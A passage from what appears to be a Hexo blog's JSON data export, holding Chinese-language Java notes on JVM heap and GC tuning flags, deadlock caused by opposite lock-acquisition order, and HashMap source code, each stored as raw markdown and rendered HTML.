0x0000000100000000, 0x0000000100000000)\n     eden space 131072K, 0% used [0x00000000f6000000,0x00000000f6000000,0x00000000fe000000)\n     from space 16384K, 99% used [0x00000000fe000000,0x00000000feffb9b0,0x00000000ff000000)\n     to   space 16384K, 0% used [0x00000000ff000000,0x00000000ff000000,0x0000000100000000)\n    ParOldGen       total 163840K, used 723K [0x0000000087e00000, 0x0000000091e00000, 0x00000000f6000000)\n     object space 163840K, 0% used [0x0000000087e00000,0x0000000087eb4d20,0x0000000091e00000)\n    Metaspace       used 14008K, capacity 14230K, committed 14464K, reserved 1062912K\n     class space    used 1295K, capacity 1356K, committed 1408K, reserved 1048576K\n   }\n   ```\n\n8. -Xloggc:/var/log/java/gc.log        指定GC日志的输出文件\n\n9. -XX:SurvivorRatio        Eden区和Survivor区的内存比值\n\n10. -XX:NewRatio        老年代和新生代的内存比值\n\n\n","source":"_posts/2019-02-17_JVM_Heep_And_Stack.md","raw":"---\ntitle: JVM堆栈笔记\ndate: 2019-02-17 10:49:00\ntags: java\npermalink: jvm-heap-stack\nkeywords: jvm, 模型, 调优参数\nrId: MB-19021701\n---\n\n## 知识点\n\n1. 堆内存默认新生代和老年代空间占比：1 : 2\n2. 新生代中默认单个Survivor区和Eden区的空间占比：1 : 8\n3. https://blog.csdn.net/leunging/article/details/80599282\n\n## 参数\n\n1. -Xms        堆内存初始大小（记忆方式，m以内存的单词memory记忆，s以small记忆，想象一下衣服的尺号就好记了），使用时：-Xms256m\n\n2. -Xmx        堆内存最大大小（记忆方式同上，最后一个x以extra记忆，同样想象下衣服的加大号就好记了）\n\n3. -Xmn        堆内存中新生代的最大内存和初始内存设为一致的值了，不再变化（记忆方式同上，n使用new记忆）\n\n4. -XX:NewSize        堆内存中新生代的初始内存，使用时：-XX:NewSize=256m\n\n5. -XX:MaxNewSize        堆内存中新生代的最大内存\n\n6. -Xss(或-XX:ThreadStackSize)        每个线程的栈内存的大小（默认1M），该数值影响可以启动的线程的数量，也影响每个线程的栈帧数量（记忆方式，Stack Size）\n\n7. -XX:+PrintGC(别名-verbose:gc)        打印gc的信息\n\n8. -XX:+PrintGCTimeStamps        以基准时间的形式打印GC的时间戳\n\n   不开启时打印如下\n\n   ```\n   [GC (Allocation Failure)  155644K->36463K(402432K), 0.0095270 secs]\n   ```\n\n   开启时打印如下\n\n   ```\n   4.609: [GC (Allocation Failure)  162642K->34898K(396800K), 0.0105201 secs]\n   ```\n\n5. -XX:+PrintGCDateStamps        以日期的形式打印GC时间戳（可以设置日期形式和基准形式同时打印）\n\n   开启时打印如下\n\n   ```\n   2019-02-25T09:36:33.424+0800: [GC (Allocation Failure)  155673K->36616K(397824K), 0.0084967 secs]\n   ```\n\n   同时开启时打印如下\n\n   ```\n   2019-02-25T09:38:16.009+0800: 6.488: [GC (Allocation Failure)  169212K->42272K(518656K), 0.0163488 secs]\n   ```\n\n6. -XX:+PrintGCDetails        打印gc的详细信息，启动脚本下运行会自动开启-XX:+PrintGC，jinfo附加下运行不会自动开启\n\n   开启时打印如下\n\n   ```\n   [GC (Allocation Failure) [PSYoungGen: 137517K->9963K(147456K)] 169528K->41982K(534528K), 0.0124863 secs] [Times: user=0.04 sys=0.00, real=0.01 secs] \n   ```\n\n7. -XX:+PrintHeapAtGC        在进行GC的前后打印出堆的信息\n\n   开启时打印如下\n\n   ```\n   {Heap before GC invocations=1 (full 0):\n    PSYoungGen      total 147456K, used 131072K [0x00000000f6000000, 0x0000000100000000, 0x0000000100000000)\n     eden space 131072K, 100% used [0x00000000f6000000,0x00000000fe000000,0x00000000fe000000)\n     from space 16384K, 0% used [0x00000000ff000000,0x00000000ff000000,0x0000000100000000)\n     to   space 16384K, 0% used [0x00000000fe000000,0x00000000fe000000,0x00000000ff000000)\n    ParOldGen       total 163840K, used 0K [0x0000000087e00000, 0x0000000091e00000, 0x00000000f6000000)\n     object space 163840K, 0% used [0x0000000087e00000,0x0000000087e00000,0x0000000091e00000)\n    Metaspace       used 14008K, capacity 14230K, committed 14464K, reserved 1062912K\n     class space    used 1295K, capacity 1356K, committed 1408K, reserved 1048576K\n   [GC (Allocation Failure)  131072K->17089K(311296K), 0.0130938 secs]\n   Heap after GC invocations=1 (full 0):\n    PSYoungGen      total 147456K, used 16366K [0x00000000f6000000, 0x0000000100000000, 0x0000000100000000)\n     eden space 131072K, 0% used [0x00000000f6000000,0x00000000f6000000,0x00000000fe000000)\n     from space 16384K, 99% used [0x00000000fe000000,0x00000000feffb9b0,0x00000000ff000000)\n     to   space 16384K, 0% used [0x00000000ff000000,0x00000000ff000000,0x0000000100000000)\n    ParOldGen       total 163840K, used 723K [0x0000000087e00000, 0x0000000091e00000, 0x00000000f6000000)\n     object space 163840K, 0% used [0x0000000087e00000,0x0000000087eb4d20,0x0000000091e00000)\n    Metaspace       used 14008K, capacity 14230K, committed 14464K, reserved 1062912K\n     class space    used 1295K, capacity 1356K, committed 1408K, reserved 1048576K\n   }\n   ```\n\n8. -Xloggc:/var/log/java/gc.log        指定GC日志的输出文件\n\n9. -XX:SurvivorRatio        Eden区和Survivor区的内存比值\n\n10. -XX:NewRatio        老年代和新生代的内存比值\n\n\n","slug":"jvm-heap-stack","published":1,"updated":"2020-01-23T08:21:31.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck5qhi0650014g0ukep0ao024","content":"<h2 id=\"知识点\"><a href=\"#知识点\" class=\"headerlink\" title=\"知识点\"></a>知识点</h2><ol>\n<li>堆内存默认新生代和老年代空间占比：1 : 2</li>\n<li>新生代中默认单个Survivor区和Eden区的空间占比：1 : 8</li>\n<li><a href=\"https://blog.csdn.net/leunging/article/details/80599282\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/leunging/article/details/80599282</a></li>\n</ol>\n<h2 id=\"参数\"><a href=\"#参数\" class=\"headerlink\" title=\"参数\"></a>参数</h2><ol>\n<li><p>-Xms        堆内存初始大小（记忆方式，m以内存的单词memory记忆，s以small记忆，想象一下衣服的尺号就好记了），使用时：-Xms256m</p>\n</li>\n<li><p>-Xmx        堆内存最大大小（记忆方式同上，最后一个x以extra记忆，同样想象下衣服的加大号就好记了）</p>\n</li>\n<li><p>-Xmn        堆内存中新生代的最大内存和初始内存设为一致的值了，不再变化（记忆方式同上，n使用new记忆）</p>\n</li>\n<li><p>-XX:NewSize        堆内存中新生代的初始内存，使用时：-XX:NewSize=256m</p>\n</li>\n<li><p>-XX:MaxNewSize        堆内存中新生代的最大内存</p>\n</li>\n<li><p>-Xss(或-XX:ThreadStackSize)        每个线程的栈内存的大小（默认1M），该数值影响可以启动的线程的数量，也影响每个线程的栈帧数量（记忆方式，Stack Size）</p>\n</li>\n<li><p>-XX:+PrintGC(别名-verbose:gc)        打印gc的信息</p>\n</li>\n<li><p>-XX:+PrintGCTimeStamps        以基准时间的形式打印GC的时间戳</p>\n<p>不开启时打印如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[GC (Allocation Failure)  155644K-&gt;36463K(402432K), 0.0095270 secs]</span><br></pre></td></tr></table></figure>\n\n<p>开启时打印如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4.609: [GC (Allocation Failure)  162642K-&gt;34898K(396800K), 0.0105201 secs]</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>-XX:+PrintGCDateStamps        以日期的形式打印GC时间戳（可以设置日期形式和基准形式同时打印）</p>\n<p>开启时打印如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">2019-02-25T09:36:33.424+0800: [GC (Allocation Failure)  155673K-&gt;36616K(397824K), 0.0084967 secs]</span><br></pre></td></tr></table></figure>\n\n<p>同时开启时打印如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">2019-02-25T09:38:16.009+0800: 6.488: [GC (Allocation Failure)  169212K-&gt;42272K(518656K), 0.0163488 secs]</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>-XX:+PrintGCDetails        打印gc的详细信息，启动脚本下运行会自动开启-XX:+PrintGC，jinfo附加下运行不会自动开启</p>\n<p>开启时打印如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[GC (Allocation Failure) [PSYoungGen: 137517K-&gt;9963K(147456K)] 169528K-&gt;41982K(534528K), 0.0124863 secs] [Times: user=0.04 sys=0.00, real=0.01 secs]</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>-XX:+PrintHeapAtGC        在进行GC的前后打印出堆的信息</p>\n<p>开启时打印如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;Heap before GC invocations=1 (full 0):</span><br><span class=\"line\"> PSYoungGen      total 147456K, used 131072K [0x00000000f6000000, 0x0000000100000000, 0x0000000100000000)</span><br><span class=\"line\">  eden space 131072K, 100% used [0x00000000f6000000,0x00000000fe000000,0x00000000fe000000)</span><br><span class=\"line\">  from space 16384K, 0% used [0x00000000ff000000,0x00000000ff000000,0x0000000100000000)</span><br><span class=\"line\">  to   space 16384K, 0% used [0x00000000fe000000,0x00000000fe000000,0x00000000ff000000)</span><br><span class=\"line\"> ParOldGen       total 163840K, used 0K [0x0000000087e00000, 0x0000000091e00000, 0x00000000f6000000)</span><br><span class=\"line\">  object space 163840K, 0% used [0x0000000087e00000,0x0000000087e00000,0x0000000091e00000)</span><br><span class=\"line\"> Metaspace       used 14008K, capacity 14230K, committed 14464K, reserved 1062912K</span><br><span class=\"line\">  class space    used 1295K, capacity 1356K, committed 1408K, reserved 1048576K</span><br><span class=\"line\">[GC (Allocation Failure)  131072K-&gt;17089K(311296K), 0.0130938 secs]</span><br><span class=\"line\">Heap after GC invocations=1 (full 0):</span><br><span class=\"line\"> PSYoungGen      total 147456K, used 16366K [0x00000000f6000000, 0x0000000100000000, 0x0000000100000000)</span><br><span class=\"line\">  eden space 131072K, 0% used [0x00000000f6000000,0x00000000f6000000,0x00000000fe000000)</span><br><span class=\"line\">  from space 16384K, 99% used [0x00000000fe000000,0x00000000feffb9b0,0x00000000ff000000)</span><br><span class=\"line\">  to   space 16384K, 0% used [0x00000000ff000000,0x00000000ff000000,0x0000000100000000)</span><br><span class=\"line\"> ParOldGen       total 163840K, used 723K [0x0000000087e00000, 0x0000000091e00000, 0x00000000f6000000)</span><br><span class=\"line\">  object space 163840K, 0% used [0x0000000087e00000,0x0000000087eb4d20,0x0000000091e00000)</span><br><span class=\"line\"> Metaspace       used 14008K, capacity 14230K, committed 14464K, reserved 1062912K</span><br><span class=\"line\">  class space    used 1295K, capacity 1356K, committed 1408K, reserved 1048576K</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>-Xloggc:/var/log/java/gc.log        指定GC日志的输出文件</p>\n</li>\n<li><p>-XX:SurvivorRatio        Eden区和Survivor区的内存比值</p>\n</li>\n<li><p>-XX:NewRatio        老年代和新生代的内存比值</p>\n</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"知识点\"><a href=\"#知识点\" class=\"headerlink\" title=\"知识点\"></a>知识点</h2><ol>\n<li>堆内存默认新生代和老年代空间占比：1 : 2</li>\n<li>新生代中默认单个Survivor区和Eden区的空间占比：1 : 8</li>\n<li><a href=\"https://blog.csdn.net/leunging/article/details/80599282\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/leunging/article/details/80599282</a></li>\n</ol>\n<h2 id=\"参数\"><a href=\"#参数\" class=\"headerlink\" title=\"参数\"></a>参数</h2><ol>\n<li><p>-Xms        堆内存初始大小（记忆方式，m以内存的单词memory记忆，s以small记忆，想象一下衣服的尺号就好记了），使用时：-Xms256m</p>\n</li>\n<li><p>-Xmx        堆内存最大大小（记忆方式同上，最后一个x以extra记忆，同样想象下衣服的加大号就好记了）</p>\n</li>\n<li><p>-Xmn        堆内存中新生代的最大内存和初始内存设为一致的值了，不再变化（记忆方式同上，n使用new记忆）</p>\n</li>\n<li><p>-XX:NewSize        堆内存中新生代的初始内存，使用时：-XX:NewSize=256m</p>\n</li>\n<li><p>-XX:MaxNewSize        堆内存中新生代的最大内存</p>\n</li>\n<li><p>-Xss(或-XX:ThreadStackSize)        每个线程的栈内存的大小（默认1M），该数值影响可以启动的线程的数量，也影响每个线程的栈帧数量（记忆方式，Stack Size）</p>\n</li>\n<li><p>-XX:+PrintGC(别名-verbose:gc)        打印gc的信息</p>\n</li>\n<li><p>-XX:+PrintGCTimeStamps        以基准时间的形式打印GC的时间戳</p>\n<p>不开启时打印如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[GC (Allocation Failure)  155644K-&gt;36463K(402432K), 0.0095270 secs]</span><br></pre></td></tr></table></figure>\n\n<p>开启时打印如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4.609: [GC (Allocation Failure)  162642K-&gt;34898K(396800K), 0.0105201 secs]</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>-XX:+PrintGCDateStamps        以日期的形式打印GC时间戳（可以设置日期形式和基准形式同时打印）</p>\n<p>开启时打印如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">2019-02-25T09:36:33.424+0800: [GC (Allocation Failure)  155673K-&gt;36616K(397824K), 0.0084967 secs]</span><br></pre></td></tr></table></figure>\n\n<p>同时开启时打印如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">2019-02-25T09:38:16.009+0800: 6.488: [GC (Allocation Failure)  169212K-&gt;42272K(518656K), 0.0163488 secs]</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>-XX:+PrintGCDetails        打印gc的详细信息，启动脚本下运行会自动开启-XX:+PrintGC，jinfo附加下运行不会自动开启</p>\n<p>开启时打印如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[GC (Allocation Failure) [PSYoungGen: 137517K-&gt;9963K(147456K)] 169528K-&gt;41982K(534528K), 0.0124863 secs] [Times: user=0.04 sys=0.00, real=0.01 secs]</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>-XX:+PrintHeapAtGC        在进行GC的前后打印出堆的信息</p>\n<p>开启时打印如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;Heap before GC invocations=1 (full 0):</span><br><span class=\"line\"> PSYoungGen      total 147456K, used 131072K [0x00000000f6000000, 0x0000000100000000, 0x0000000100000000)</span><br><span class=\"line\">  eden space 131072K, 100% used [0x00000000f6000000,0x00000000fe000000,0x00000000fe000000)</span><br><span class=\"line\">  from space 16384K, 0% used [0x00000000ff000000,0x00000000ff000000,0x0000000100000000)</span><br><span class=\"line\">  to   space 16384K, 0% used [0x00000000fe000000,0x00000000fe000000,0x00000000ff000000)</span><br><span class=\"line\"> ParOldGen       total 163840K, used 0K [0x0000000087e00000, 0x0000000091e00000, 0x00000000f6000000)</span><br><span class=\"line\">  object space 163840K, 0% used [0x0000000087e00000,0x0000000087e00000,0x0000000091e00000)</span><br><span class=\"line\"> Metaspace       used 14008K, capacity 14230K, committed 14464K, reserved 1062912K</span><br><span class=\"line\">  class space    used 1295K, capacity 1356K, committed 1408K, reserved 1048576K</span><br><span class=\"line\">[GC (Allocation Failure)  131072K-&gt;17089K(311296K), 0.0130938 secs]</span><br><span class=\"line\">Heap after GC invocations=1 (full 0):</span><br><span class=\"line\"> PSYoungGen      total 147456K, used 16366K [0x00000000f6000000, 0x0000000100000000, 0x0000000100000000)</span><br><span class=\"line\">  eden space 131072K, 0% used [0x00000000f6000000,0x00000000f6000000,0x00000000fe000000)</span><br><span class=\"line\">  from space 16384K, 99% used [0x00000000fe000000,0x00000000feffb9b0,0x00000000ff000000)</span><br><span class=\"line\">  to   space 16384K, 0% used [0x00000000ff000000,0x00000000ff000000,0x0000000100000000)</span><br><span class=\"line\"> ParOldGen       total 163840K, used 723K [0x0000000087e00000, 0x0000000091e00000, 0x00000000f6000000)</span><br><span class=\"line\">  object space 163840K, 0% used [0x0000000087e00000,0x0000000087eb4d20,0x0000000091e00000)</span><br><span class=\"line\"> Metaspace       used 14008K, capacity 14230K, committed 14464K, reserved 1062912K</span><br><span class=\"line\">  class space    used 1295K, capacity 1356K, committed 1408K, reserved 1048576K</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>-Xloggc:/var/log/java/gc.log        指定GC日志的输出文件</p>\n</li>\n<li><p>-XX:SurvivorRatio        Eden区和Survivor区的内存比值</p>\n</li>\n<li><p>-XX:NewRatio        老年代和新生代的内存比值</p>\n</li>\n</ol>\n"},{"title":"多线程死锁分析与加锁原则观点","date":"2019-03-07T13:51:20.000Z","keywords":"死锁, 分析, 原则","rId":"MB-19030701","_content":"\n1. 单条线程只同时持有一个锁的情况下，无论多少条线程肯定不会造成死锁\n2. 同时持有多个锁的代码，只要不出现持锁顺序（考虑传递性）相反的情况，无论多少条线程肯定不会出现死锁\n## 死锁分析\n### 非传递性持锁顺序相反的死锁案例\n![MB19030701-1.png](../static/MB19030701-1.png)\n\n\n线程1持有锁a等待锁b，线程2持有锁b等待锁a。这种情况下的分析，线程1上锁的顺序是ab，线程2上锁的顺序是ba，持锁顺序相反，代码运行到特定的点会导致死锁的情况出现\n\n### 传递性下的持锁顺序相反的死锁案例\n![MB19030701-2.png](../static/MB19030701-2.png)\n\n\n\n线程1持有锁a等待锁b，线程2持有锁b等待锁c，线程3持有锁c等待锁a。这种情况，就是传递性情况下持锁顺序相反导致的死锁（就是我们通常说的构成了闭环）。线程1上锁的顺序是ab，线程2上锁的顺序是bc，线程3持锁的顺序为ca。这种情况下的分析，考虑作并线处理分析。将线程1与线程2并线分析，则他们并线后持锁顺序是abc，而线程3的持锁顺序是ca，这里面两边ac锁的顺序相反，代码运行到特定的点会导致死锁的情况出现","source":"_posts/2019-03-07_lock.md","raw":"---\ntitle: 多线程死锁分析与加锁原则观点\ndate: 2019-03-07 21:51:20\ntags: java\npermalink: lock-opinion\nkeywords: 死锁, 分析, 原则\nrId: MB-19030701\n---\n\n1. 单条线程只同时持有一个锁的情况下，无论多少条线程肯定不会造成死锁\n2. 同时持有多个锁的代码，只要不出现持锁顺序（考虑传递性）相反的情况，无论多少条线程肯定不会出现死锁\n## 死锁分析\n### 非传递性持锁顺序相反的死锁案例\n![MB19030701-1.png](../static/MB19030701-1.png)\n\n\n线程1持有锁a等待锁b，线程2持有锁b等待锁a。这种情况下的分析，线程1上锁的顺序是ab，线程2上锁的顺序是ba，持锁顺序相反，代码运行到特定的点会导致死锁的情况出现\n\n### 传递性下的持锁顺序相反的死锁案例\n![MB19030701-2.png](../static/MB19030701-2.png)\n\n\n\n线程1持有锁a等待锁b，线程2持有锁b等待锁c，线程3持有锁c等待锁a。这种情况，就是传递性情况下持锁顺序相反导致的死锁（就是我们通常说的构成了闭环）。线程1上锁的顺序是ab，线程2上锁的顺序是bc，线程3持锁的顺序为ca。这种情况下的分析，考虑作并线处理分析。将线程1与线程2并线分析，则他们并线后持锁顺序是abc，而线程3的持锁顺序是ca，这里面两边ac锁的顺序相反，代码运行到特定的点会导致死锁的情况出现","slug":"lock-opinion","published":1,"updated":"2020-01-23T08:21:31.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck5qhi0660016g0uk1km2ih0u","content":"<ol>\n<li>单条线程只同时持有一个锁的情况下，无论多少条线程肯定不会造成死锁</li>\n<li>同时持有多个锁的代码，只要不出现持锁顺序（考虑传递性）相反的情况，无论多少条线程肯定不会出现死锁<h2 id=\"死锁分析\"><a href=\"#死锁分析\" class=\"headerlink\" title=\"死锁分析\"></a>死锁分析</h2><h3 id=\"非传递性持锁顺序相反的死锁案例\"><a href=\"#非传递性持锁顺序相反的死锁案例\" class=\"headerlink\" title=\"非传递性持锁顺序相反的死锁案例\"></a>非传递性持锁顺序相反的死锁案例</h3><img src=\"../static/MB19030701-1.png\" alt=\"MB19030701-1.png\"></li>\n</ol>\n<p>线程1持有锁a等待锁b，线程2持有锁b等待锁a。这种情况下的分析，线程1上锁的顺序是ab，线程2上锁的顺序是ba，持锁顺序相反，代码运行到特定的点会导致死锁的情况出现</p>\n<h3 id=\"传递性下的持锁顺序相反的死锁案例\"><a href=\"#传递性下的持锁顺序相反的死锁案例\" class=\"headerlink\" title=\"传递性下的持锁顺序相反的死锁案例\"></a>传递性下的持锁顺序相反的死锁案例</h3><p><img src=\"../static/MB19030701-2.png\" alt=\"MB19030701-2.png\"></p>\n<p>线程1持有锁a等待锁b，线程2持有锁b等待锁c，线程3持有锁c等待锁a。这种情况，就是传递性情况下持锁顺序相反导致的死锁（就是我们通常说的构成了闭环）。线程1上锁的顺序是ab，线程2上锁的顺序是bc，线程3持锁的顺序为ca。这种情况下的分析，考虑作并线处理分析。将线程1与线程2并线分析，则他们并线后持锁顺序是abc，而线程3的持锁顺序是ca，这里面两边ac锁的顺序相反，代码运行到特定的点会导致死锁的情况出现</p>\n","site":{"data":{}},"excerpt":"","more":"<ol>\n<li>单条线程只同时持有一个锁的情况下，无论多少条线程肯定不会造成死锁</li>\n<li>同时持有多个锁的代码，只要不出现持锁顺序（考虑传递性）相反的情况，无论多少条线程肯定不会出现死锁<h2 id=\"死锁分析\"><a href=\"#死锁分析\" class=\"headerlink\" title=\"死锁分析\"></a>死锁分析</h2><h3 id=\"非传递性持锁顺序相反的死锁案例\"><a href=\"#非传递性持锁顺序相反的死锁案例\" class=\"headerlink\" title=\"非传递性持锁顺序相反的死锁案例\"></a>非传递性持锁顺序相反的死锁案例</h3><img src=\"../static/MB19030701-1.png\" alt=\"MB19030701-1.png\"></li>\n</ol>\n<p>线程1持有锁a等待锁b，线程2持有锁b等待锁a。这种情况下的分析，线程1上锁的顺序是ab，线程2上锁的顺序是ba，持锁顺序相反，代码运行到特定的点会导致死锁的情况出现</p>\n<h3 id=\"传递性下的持锁顺序相反的死锁案例\"><a href=\"#传递性下的持锁顺序相反的死锁案例\" class=\"headerlink\" title=\"传递性下的持锁顺序相反的死锁案例\"></a>传递性下的持锁顺序相反的死锁案例</h3><p><img src=\"../static/MB19030701-2.png\" alt=\"MB19030701-2.png\"></p>\n<p>线程1持有锁a等待锁b，线程2持有锁b等待锁c，线程3持有锁c等待锁a。这种情况，就是传递性情况下持锁顺序相反导致的死锁（就是我们通常说的构成了闭环）。线程1上锁的顺序是ab，线程2上锁的顺序是bc，线程3持锁的顺序为ca。这种情况下的分析，考虑作并线处理分析。将线程1与线程2并线分析，则他们并线后持锁顺序是abc，而线程3的持锁顺序是ca，这里面两边ac锁的顺序相反，代码运行到特定的点会导致死锁的情况出现</p>\n"},{"title":"HashMap源码阅读笔记","date":"2019-02-28T13:48:24.000Z","keywords":"hashmap","rId":"MB-19022801","_content":"\n## tableSizeFor方法\n```\nstatic final int tableSizeFor(int cap) {\n        int n = cap - 1;\n        n |= n >>> 1;\n        n |= n >>> 2;\n        n |= n >>> 4;\n        n |= n >>> 8;\n        n |= n >>> 16;\n        return (n < 0) ? 1 : (n >= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : n + 1;\n    }\n```\n由公式：`(a|b)>>>k = (a>>>k)|(b>>>k)` 及`a|b|b = a|b`及交换律得到一个推论： \n```\n若a = n>>>0|n>>>1|n>>>2|n>>>3|....|n>>>(2的k次方-1) ，那么a | a >>> (2的k次方) = n >>> (2的k+1次方 - 1)\n```\n所以上面的`n>>>1`到`n>>>16`部分的代码计算相当于求 `n|n>>>1|n>>>2|n>>>3|...|n>>>31`(n取原始值），即得到的数为二进制包含最高位以下的位全部置1，例如：若n=15=0b1111，最终得到0b1111=15；若n=12=0b1100，最终得到0b1111=15；若n=0b0101，最终得到0b0111=7\n\n\n## resize方法\n```\nfinal Node<K,V>[] resize() {\n        Node<K,V>[] oldTab = table;\n        int oldCap = (oldTab == null) ? 0 : oldTab.length;\n        int oldThr = threshold;\n        int newCap, newThr = 0;\n        if (oldCap > 0) {\n            if (oldCap >= MAXIMUM_CAPACITY) {  // 实际数量超过Integer.MAX_VALUE的一半，数组的容量设为Integer.MAX_VALUE\n                threshold = Integer.MAX_VALUE;\n                return oldTab;\n            }\n            // 数组容量翻倍，并且旧的容量不小于于初始容量时，同时也将阈值翻倍\n            else if ((newCap = oldCap << 1) < MAXIMUM_CAPACITY &&\n                     oldCap >= DEFAULT_INITIAL_CAPACITY)\n                newThr = oldThr << 1; // double threshold\n        }\n        else if (oldThr > 0) // 新建类时有设置阈值但没设置数组容量，则以阈值作为容量\n            newCap = oldThr;\n        else {               // 新建时什么都没有设置，给默认值：16 和 16 * 0.75\n            newCap = DEFAULT_INITIAL_CAPACITY;\n            newThr = (int)(DEFAULT_LOAD_FACTOR * DEFAULT_INITIAL_CAPACITY);\n        }\n        if (newThr == 0) { // 检查阈值设置，未设置时由 容量阈值比和容量乘积计算\n            float ft = (float)newCap * loadFactor;\n            newThr = (newCap < MAXIMUM_CAPACITY && ft < (float)MAXIMUM_CAPACITY ?\n                      (int)ft : Integer.MAX_VALUE);\n        }\n        threshold = newThr;\n        @SuppressWarnings({\"rawtypes\",\"unchecked\"})\n            Node<K,V>[] newTab = (Node<K,V>[])new Node[newCap];\n        table = newTab;\n        // 扩容后重新放置节点\n        if (oldTab != null) {\n            for (int j = 0; j < oldCap; ++j) {\n                Node<K,V> e;\n                if ((e = oldTab[j]) != null) {\n                    oldTab[j] = null;\n                    if (e.next == null) // 数组位置的树只有一个节点，扩容后，新位置当然也只有一个节点\n                        newTab[e.hash & (newCap - 1)] = e;\n                    else if (e instanceof TreeNode) // 数组+树结构时，执行树的分割\n                        ((TreeNode<K,V>)e).split(this, newTab, j, oldCap);\n                    else { // 数组+链表时，链表分割为两份，直接比较扩容后(capacity - 1)的值新增加的那一位即可知道分割到哪一部分\n                        Node<K,V> loHead = null, loTail = null;    // 分割到低位上的节点的头与尾\n                        Node<K,V> hiHead = null, hiTail = null;    // 分割到高位上的节点的头和尾\n                        Node<K,V> next;\n                        do {\n                            next = e.next;\n                            if ((e.hash & oldCap) == 0) { // hash值对应于新扩容后的位（oldCap刚好是新扩容的长度的新增位，实际上应写为(newCap - 1 - (oldCap - 1))的值，由于刚好等于oldCap所以就减少了计算）的值是0，分割到0值的那一部分\n                                if (loTail == null)\n                                    loHead = e;\n                                else\n                                    loTail.next = e;\n                                loTail = e;\n                            }\n                            else {   // hash值对应于(newCap - 1)的新的位的值为1，分割到1值的那一部分\n                                if (hiTail == null)\n                                    hiHead = e;\n                                else\n                                    hiTail.next = e;\n                                hiTail = e;\n                            }\n                        } while ((e = next) != null);\n                        if (loTail != null) {\n                            loTail.next = null;\n                            newTab[j] = loHead;\n                        }\n                        if (hiTail != null) {\n                            hiTail.next = null;\n                            newTab[j + oldCap] = hiHead;\n                        }\n                    }\n                }\n            }\n        }\n        return newTab;\n    }\n```\n\n## TreeNode结构\nHashMap在数据量较小时，使用的数组+链表的结构，当数据量较大时使用数组+树的结构。由数组+链表到数组+树的结构的转化，在于`treeifyBin`方法。当链表的长度大于7时，会触发`treeifyBin`方法判断是否转变存储结构，当数组的长度也大于63时，即会使该hash值的链表结构变更为树结构。","source":"_posts/2019-02-28_Source_Hashmap.md","raw":"---\ntitle: HashMap源码阅读笔记\ndate: 2019-02-28 21:48:24\ntags: java\npermalink: source-hashmap\nkeywords: hashmap\nrId: MB-19022801\n---\n\n## tableSizeFor方法\n```\nstatic final int tableSizeFor(int cap) {\n        int n = cap - 1;\n        n |= n >>> 1;\n        n |= n >>> 2;\n        n |= n >>> 4;\n        n |= n >>> 8;\n        n |= n >>> 16;\n        return (n < 0) ? 1 : (n >= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : n + 1;\n    }\n```\n由公式：`(a|b)>>>k = (a>>>k)|(b>>>k)` 及`a|b|b = 